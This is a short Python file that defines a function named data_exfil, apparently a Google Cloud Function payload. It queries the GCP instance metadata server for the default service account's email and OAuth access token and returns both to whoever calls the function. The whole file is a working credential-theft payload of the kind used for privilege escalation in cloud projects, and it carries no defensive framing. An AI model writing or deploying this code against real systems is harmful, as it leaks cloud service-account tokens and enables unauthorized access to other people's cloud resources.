import requests
def data_exfil(request):
    res_email = requests.get('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email', headers={'Metadata-Flavor': 'Google'})
    res_token = requests.get('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor': 'Google'})
    output_data = {
        "email": res_email.text,
        "token": res_token.text
    }
    return output_data
